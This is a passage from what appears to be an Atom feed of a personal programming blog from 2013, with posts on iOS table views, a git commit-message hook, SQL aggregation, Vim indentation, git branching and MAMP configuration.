class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the cell will be returned to the tableView</span></span><br><span class="line">- (<span class="built_in">UITableViewCell</span> *)tableView:(<span class="built_in">UITableView</span> *)theTableView cellForRowAtIndexPath:(<span class="built_in">NSIndexPath</span> *)indexPath</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="built_in">NSString</span> *cellIdentifier = <span class="string">@&quot;HistoryCell&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Similar to UITableViewCell, but </span></span><br><span class="line">    JSCustomCell *cell = (JSCustomCell *)[theTableView dequeueReusableCellWithIdentifier:cellIdentifier];</span><br><span class="line">    <span class="keyword">if</span> (cell == <span class="literal">nil</span>) &#123;</span><br><span class="line">        cell = [[JSCustomCell alloc] initWithStyle:<span class="built_in">UITableViewCellStyleDefault</span> reuseIdentifier:cellIdentifier];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Just want to test, so I hardcode the data</span></span><br><span class="line">    cell.descriptionLabel.text = <span class="string">@&quot;Testing&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> cell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UITableViewDelegate</span></span><br><span class="line"><span class="comment">// when user tap the row, what action you want to perform</span></span><br><span class="line">- (<span class="type">void</span>)tableView:(<span class="built_in">UITableView</span> *)theTableView didSelectRowAtIndexPath:(<span class="built_in">NSIndexPath</span> *)indexPath</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@&quot;selected %d row&quot;</span>, indexPath.row);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@end</span></span><br></pre></td></tr></table></figure><p>Simple? Basically is all the same, the only different is you have to configure those controls programmatically.</p><p>Have fun :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Personally, I don’t like to use Xcode’s interface builder. I felt that everything programmatically will be easier to debug.&lt;/p&gt;
&lt;p&gt;This</summary>
        
      
    
    
    
    
    <category term="programming" scheme="http://jslim.net/tags/programming/"/>
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>NSInvalidArgumentException caused by UITableViewCell</title>
    <link href="http://jslim.net/blog/2013/03/02/nsinvalidargumentexception-caused-by-uitableviewcell/"/>
    <id>http://jslim.net/blog/2013/03/02/nsinvalidargumentexception-caused-by-uitableviewcell/</id>
    <published>2013-03-02T10:36:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I keep hitting an error like this</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2013</span>-<span class="number">03</span>-<span class="number">02</span> <span class="number">18</span>:<span class="number">34</span>:<span class="number">52.488</span> StoreSearch[<span class="number">84541</span>:c07] -[UITableViewCell nameLabel]: unrecognized selector sent to instance <span class="number">0x6a7d880</span></span><br><span class="line"><span class="number">2013</span>-<span class="number">03</span>-<span class="number">02</span> <span class="number">18</span>:<span class="number">34</span>:<span class="number">52.489</span> StoreSearch[<span class="number">84541</span>:c07] *** Terminating app due to uncaught exception <span class="string">&#x27;NSInvalidArgumentException&#x27;</span>, reason: <span class="string">&#x27;-[UITableViewCell nameLabel]: unrecognized selector sent to instance 0x6a7d880&#x27;</span></span><br><span class="line">*** First throw <span class="keyword">call</span> stack:</span><br><span class="line">(<span class="number">0x14ab052</span> <span class="number">0xeabd0a</span> <span class="number">0x14acced</span> <span class="number">0x1411f00</span> <span class="number">0x1411ce2</span> <span class="number">0x3717</span> <span class="number">0xb4e0f</span> <span class="number">0xb5589</span> <span class="number">0xa0dfd</span> <span class="number">0xaf851</span> <span class="number">0x5a322</span> <span class="number">0x14ace72</span> <span class="number">0x1d6e92d</span> <span class="number">0x1d78827</span> <span class="number">0x1cfefa7</span> <span class="number">0x1d00ea6</span> <span class="number">0x1d00580</span> <span class="number">0x147f9ce</span> <span class="number">0x1416670</span> <span class="number">0x13e24f6</span> <span class="number">0x13e1db4</span> <span class="number">0x13e1ccb</span> <span class="number">0x1394879</span> <span class="number">0x139493e</span> <span class="number">0x1ba9b</span> <span class="number">0x20bd</span> <span class="number">0x1fe5</span>)</span><br><span class="line">terminate called throwing an exception(lldb)</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2013-03-02-nsinvalidargumentexception-caused-by-uitableviewcell/uitableviewcell-error.png" alt="Error thread"></p><p>This took me few hours to figure out the problem. The problem is just make use of wrong <strong>cell identifier</strong>.</p><p>Finally I change this</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *<span class="keyword">const</span> SearchResultCellIdentifier = <span class="string">@&quot;NothingFoundCell&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *<span class="keyword">const</span> NothingFoundCellIdentifier = <span class="string">@&quot;NothingFoundCell&quot;</span>;</span><br></pre></td></tr></table></figure><p>to this</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *<span class="keyword">const</span> SearchResultCellIdentifier = <span class="string">@&quot;SearchResultCell&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="built_in">NSString</span> *<span class="keyword">const</span> NothingFoundCellIdentifier = <span class="string">@&quot;NothingFoundCell&quot;</span>;</span><br></pre></td></tr></table></figure><p>Problem solved :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I keep hitting an error like this&lt;/p&gt;
&lt;figure class=&quot;highlight x86asm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span</summary>
        
      
    
    
    
    
    <category term="programming" scheme="http://jslim.net/tags/programming/"/>
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Restrict Git commit message to certain pattern</title>
    <link href="http://jslim.net/blog/2013/02/26/restrict-git-commit-message-to-certain-pattern/"/>
    <id>http://jslim.net/blog/2013/02/26/restrict-git-commit-message-to-certain-pattern/</id>
    <published>2013-02-26T11:21:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>For certain reason, some time you want your commit message to follow a standard pattern.</p><p>i.e. PJK-001: my message</p><p>Want to have a project code and assignment code there.</p><p>Now, open up your project git directory.</p><p>i.e. <strong>/path/to/your/project/.git/hooks/</strong></p><p>and edit <strong>commit-msg</strong> file <em>(if doesn’t exist, create it)</em></p><p><strong>(NOTE: This example I’ll write in Python)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">message_file = sys.argv[<span class="number">1</span>]</span><br><span class="line">message = <span class="built_in">open</span>(message_file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Match with a specified pattern</span></span><br><span class="line">match = re.match(<span class="string">r&#x27;PJK-(\d+):\ &#x27;</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> match <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Your commit has been rejected!&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Commit message must begin with \&#x27;PJK-(\d+): \&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;i.e. PJK-12: this is a commit message&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>Simple right? But don’t remember to change it to executable and no <code>.py</code> extension</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod <span class="number">755</span> <span class="regexp">/path/</span>to<span class="regexp">/your/</span><span class="keyword">project</span><span class="regexp">/.git/</span>hooks/commit-msg</span><br></pre></td></tr></table></figure><p>References:</p><ul><li><em><a href="http://git-scm.com/book/en/Customizing-Git-An-Example-Git-Enforced-Policy#Client-Side-Hooks">Customizing Git - An Example Git-Enforced Policy</a></em></li><li><em><a href="http://stackoverflow.com/questions/1152385/alternative-to-the-match-re-match-if-match-idiom">Alternative to the ‘match = re.match(); if match: …’ idiom?</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;For certain reason, some time you want your commit message to follow a standard pattern.&lt;/p&gt;
&lt;p&gt;i.e. PJK-001: my message&lt;/p&gt;
&lt;p&gt;Want to</summary>
        
      
    
    
    
    
    <category term="git" scheme="http://jslim.net/tags/git/"/>
    
    <category term="python" scheme="http://jslim.net/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SQL - SELECT SUM joined with another table</title>
    <link href="http://jslim.net/blog/2013/02/06/sql-select-sum-joined-with-another-table/"/>
    <id>http://jslim.net/blog/2013/02/06/sql-select-sum-joined-with-another-table/</id>
    <published>2013-02-06T07:44:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I had always face a scenerio like this:</p><p>There are 2 tables</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">user</span><span class="params">(id, first_name, last_name)</span></span></span><br><span class="line"><span class="function"><span class="title">transaction</span><span class="params">(id, qty, user_id)</span></span></span><br></pre></td></tr></table></figure><p>Now I want to SUM all the quantity based on <strong>user</strong>, typically what I did is</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> user_id, <span class="built_in">SUM</span>(qty) <span class="keyword">as</span> total</span><br><span class="line"><span class="keyword">FROM</span> transaction</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> user_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> total <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure><p>But the problem is, I want the <strong>first_name</strong> and <strong>last_name</strong> as well. How to get this in one query?</p><p>I had found a solution <a href="http://stackoverflow.com/questions/4276785/how-to-get-sum-from-joined-table-b-with-multiple-results-againts-one-row-in-tabl#answers">here</a>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, first_name, last_name, total</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">user</span> u</span><br><span class="line"><span class="keyword">JOIN</span> (</span><br><span class="line">  <span class="keyword">SELECT</span> user_id, <span class="built_in">SUM</span>(qty) <span class="keyword">as</span> total</span><br><span class="line">  <span class="keyword">FROM</span> transaction</span><br><span class="line">  <span class="keyword">GROUP</span> <span class="keyword">BY</span> user_id</span><br><span class="line">) <span class="keyword">AS</span> t <span class="keyword">ON</span> u.id <span class="operator">=</span> t.user_id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> total <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I had always face a scenerio like this:&lt;/p&gt;
&lt;p&gt;There are 2 tables&lt;/p&gt;
&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td</summary>
        
      
    
    
    
    
    <category term="sql" scheme="http://jslim.net/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Vim - Set indentation based on file type</title>
    <link href="http://jslim.net/blog/2013/02/05/vim-set-indentation-based-on-file-type/"/>
    <id>http://jslim.net/blog/2013/02/05/vim-set-indentation-based-on-file-type/</id>
    <published>2013-02-05T09:13:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Let say now you want your <strong>.js</strong> <em>(JavaScript)</em> file to 2 space indent.</p><p>Create a file named <code>javascript.vim</code> <strong>(NOT <code>js.vim</code>)</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> ~/.vim/ftplugin/javascript.vim</span></span><br></pre></td></tr></table></figure><p>Add the content below to <code>~/.vim/ftplugin/javascript.vim</code></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&quot; Auto expand tabs to spaces (use space rather than tab)</span></span><br><span class="line"><span class="keyword">setlocal</span> expandtab</span><br><span class="line"><span class="keyword">setlocal</span> <span class="built_in">shiftwidth</span>=<span class="number">2</span></span><br><span class="line"><span class="keyword">setlocal</span> tabstop=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; Auto indent after a &#123;</span></span><br><span class="line"><span class="keyword">setlocal</span> autoindent</span><br><span class="line"><span class="keyword">setlocal</span> smartindent</span><br></pre></td></tr></table></figure><p>Use <code>setlocal</code> rather than <code>set</code> because you only want it to apply to <strong>.js</strong> files.</p><p><em>Reference: <a href="http://stackoverflow.com/questions/158968/changing-vim-indentation-behavior-by-file-type#answers">Changing Vim indentation behavior by file type</a></em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Let say now you want your &lt;strong&gt;.js&lt;/strong&gt; &lt;em&gt;(JavaScript)&lt;/em&gt; file to 2 space indent.&lt;/p&gt;
&lt;p&gt;Create a file named</summary>
        
      
    
    
    
    
    <category term="vim" scheme="http://jslim.net/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>My practice Git Model</title>
    <link href="http://jslim.net/blog/2013/02/05/my-practice-git-model/"/>
    <id>http://jslim.net/blog/2013/02/05/my-practice-git-model/</id>
    <published>2013-02-05T07:57:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Thanks to <a href="http://nvie.com/posts/a-successful-git-branching-model/">this</a> post. It get me more understand in Git.</p><p>Let’s have a try.</p><h3 id="1-Create-a-new-repo-on-Github"><a href="#1-Create-a-new-repo-on-Github" class="headerlink" title="1. Create a new repo on Github"></a>1. Create a new repo on <a href="https://github.com/">Github</a></h3><p><img src="/images/posts/2013-02-05-my-practice-git-model/create-repo.png" alt="Create Repo"></p><p>Your first commit to <strong>master</strong> branch</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> &lt;your-project&gt;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> README.md</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add README.md</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -a -m <span class="string">&quot;- initial commit&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push origin master</span></span><br></pre></td></tr></table></figure><h3 id="2-Create-a-develop-branch"><a href="#2-Create-a-develop-branch" class="headerlink" title="2. Create a develop branch"></a>2. Create a <code>develop</code> branch</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Branch out `develop` from `master`</span></span><br><span class="line"><span class="variable">$ </span>git checkout -b develop master</span><br><span class="line"></span><br><span class="line"><span class="comment"># make some changes</span></span><br><span class="line"><span class="variable">$ </span>echo <span class="string">&quot;This is branched out from master&quot;</span> &gt;&gt; <span class="title class_">README</span>.md</span><br><span class="line"><span class="variable">$ </span>git commit -a -m <span class="string">&quot;- initialize develop branch&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Push to remote server and create a new branch</span></span><br><span class="line"><span class="variable">$ </span>git push origin develop</span><br></pre></td></tr></table></figure><p>Now you have 2 branches in your Github</p><p><img src="/images/posts/2013-02-05-my-practice-git-model/2-branches-in-github.png" alt="Show 2 branches"></p><h3 id="3-Now-add-a-new-module"><a href="#3-Now-add-a-new-module" class="headerlink" title="3. Now add a new module"></a>3. Now add a new module</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Branch out `module1` from `develop`</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout -b module1 develop</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Make some changes</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> new_module</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> new_module</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">touch</span> file1 file2 file3</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ..</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Add &amp; Commit</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add new_module</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git commit -a -m <span class="string">&quot;- added new module&quot;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Show all branches you have</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Switch to `develop`</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout develop</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Merge with branch `module1`</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge --no-ff module1</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Delete `module1` branch</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -d module1</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">push to remote server</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push origin develop</span></span><br></pre></td></tr></table></figure><h3 id="4-Everything-tested-fine-merge-to-master-branch"><a href="#4-Everything-tested-fine-merge-to-master-branch" class="headerlink" title="4. Everything tested fine, merge to master branch"></a>4. Everything tested fine, merge to <code>master</code> branch</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Switch to `master`</span></span><br><span class="line"><span class="variable">$ </span>git checkout master</span><br><span class="line"></span><br><span class="line"><span class="comment"># Merge with branch `develop`</span></span><br><span class="line"><span class="variable">$ </span>git merge --no-ff develop</span><br><span class="line"></span><br><span class="line"><span class="comment"># Push to remote server</span></span><br><span class="line"><span class="variable">$ </span>git push origin master</span><br></pre></td></tr></table></figure><p>If you work on only a single branch, consider a situation here:</p><p>Now you have assigned a new module, you work on the new module. Suddenly, the life copy got some bugs that need you to be fix urgently, but now you’re working on the new module which is not yet complete.</p><p>Imagine the situation above happened, it may take you a lot of time to handle this. Thus use the branching model to avoid this situation happen.</p><p><em>Reference: <a href="http://nvie.com/posts/a-successful-git-branching-model/">A successful Git branching model</a></em></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Thanks to &lt;a href=&quot;http://nvie.com/posts/a-successful-git-branching-model/&quot;&gt;this&lt;/a&gt; post. It get me more understand in</summary>
        
      
    
    
    
    
    <category term="git" scheme="http://jslim.net/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Enable display_errors in MAMP</title>
    <link href="http://jslim.net/blog/2013/01/30/enable-display-errors-in-mamp/"/>
    <id>http://jslim.net/blog/2013/01/30/enable-display-errors-in-mamp/</id>
    <published>2013-01-30T08:50:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>As we all know that to enable <code>display_errors</code> was an easy task. Unfortunately I’ve made more than 10 attempts to configure this.</p><p>Initially I was edit <strong>/Applications/MAMP/conf/php5.4.4/php.ini</strong>, it doesn’t solve my problem. Then I’ve tried to edit all <strong>php.ini</strong> in each php version. Sadly, it failed again.</p><p>Finally, I echo out <code>phpInfo()</code> to see it’s attributes, and the value of <code>display_errors</code> was <strong><code>Off</code></strong>. The path for <strong>php.ini</strong> was located in <strong>/Applications/MAMP/bin/php/php5.4.4/conf/php.ini</strong>. :|</p><p>Damn!</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;As we all know that to enable &lt;code&gt;display_errors&lt;/code&gt; was an easy task. Unfortunately I’ve made more than 10 attempts to configure</summary>
        
      
    
    
    
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="mac" scheme="http://jslim.net/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>Unknown error when setting up virtual host in MAMP</title>
    <link href="http://jslim.net/blog/2013/01/29/unknown-error-when-setting-up-virtual-host-in-mamp/"/>
    <id>http://jslim.net/blog/2013/01/29/unknown-error-when-setting-up-virtual-host-in-mamp/</id>
    <published>2013-01-29T07:49:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I’m struggling for half day just to setup virtual host in MAMP.</p><p><strong>/Applications/MAMP/conf/apache/extra/httpd-vhosts.conf</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NameVirtualHost</span> *:<span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;VirtualHost *<span class="number">:80</span>&gt;</span></span><br><span class="line">    <span class="attribute">ServerAdmin</span> webmaster@dummy-host.example.com</span><br><span class="line">    <span class="attribute">DocumentRoot</span> <span class="string">&quot;/path/to/project&quot;</span></span><br><span class="line">    <span class="attribute">ServerName</span> www-yourproject.com</span><br><span class="line">    <span class="section">&lt;Directory <span class="string">&quot;/path/to/project&quot;</span>&gt;</span></span><br><span class="line">        <span class="attribute">Options</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">        <span class="attribute">Order</span> <span class="literal">allow</span>,<span class="literal">deny</span></span><br><span class="line">        <span class="attribute">allow</span> from <span class="literal">all</span></span><br><span class="line">    <span class="section">&lt;/Directory&gt;</span></span><br><span class="line"><span class="section">&lt;/VirtualHost&gt;</span></span><br></pre></td></tr></table></figure><p>and for the file <strong>/Applications/MAMP/conf/apache/httpd.conf</strong></p><p>Change from</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Virtual hosts</span><br><span class="line">#<span class="keyword">Include</span> <span class="regexp">/Applications/M</span>AMP<span class="regexp">/conf/</span>apache<span class="regexp">/extra/</span>httpd-vhosts.conf</span><br></pre></td></tr></table></figure><p>to</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Virtual hosts</span></span><br><span class="line">Include <span class="regexp">/Applications/</span>MAMP<span class="regexp">/conf/</span>apache<span class="regexp">/extra/</span>httpd-vhosts.conf</span><br></pre></td></tr></table></figure><p>to uncomment the httpd-vhosts.conf</p><p>In <strong>/etc/hosts</strong>, add a line below</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span>www-yourproject.com</span><br></pre></td></tr></table></figure><p>I’ve done all these setting, but the MAMP still not able to start.</p><p>At the end, I figured out that the error was occurred in</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Directory <span class="string">&quot;/path/to/project&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">Options</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">AllowOverride</span> <span class="literal">All</span></span><br><span class="line">    <span class="attribute">Order</span> <span class="literal">allow</span>,<span class="literal">deny</span></span><br><span class="line">    <span class="attribute">allow</span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>this portion. It look correct and no mistake at all.</p><p>After struggling for half day, I re-type that portion of code, finally it works.</p><p>Damnnnn, it was those special characters error which we cannot see.</p><p>May be I’m too lucky to meet such a situation :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I’m struggling for half day just to setup virtual host in</summary>
        
      
    
    
    
    
    <category term="setup-configuration" scheme="http://jslim.net/tags/setup-configuration/"/>
    
    <category term="mac" scheme="http://jslim.net/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>iOS: Hide keyboard when the user tapped else where</title>
    <link href="http://jslim.net/blog/2013/01/20/ios-hide-keyboard-when-the-user-tapped-else-where/"/>
    <id>http://jslim.net/blog/2013/01/20/ios-hide-keyboard-when-the-user-tapped-else-where/</id>
    <published>2013-01-20T10:00:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>In certain circumstances (i.e. The table row to edit.), we do want the keyboard to be hide in order to improve user experience</p><p>In <strong>YourViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="built_in">UITapGestureRecognizer</span> *gestureRecognizer = [[<span class="built_in">UITapGestureRecognizer</span> alloc] initWithTarget:<span class="keyword">self</span> action:<span class="keyword">@selector</span>(hideKeyboard:)];</span><br><span class="line">        </span><br><span class="line">    gestureRecognizer.cancelsTouchesInView = <span class="literal">NO</span>;</span><br><span class="line">    [<span class="keyword">self</span>.tableView addGestureRecognizer:gestureRecognizer];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)hideKeyboard:(<span class="built_in">UIGestureRecognizer</span> *)gestureRecognizer</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">CGPoint</span> point = [gestureRecognizer locationInView:<span 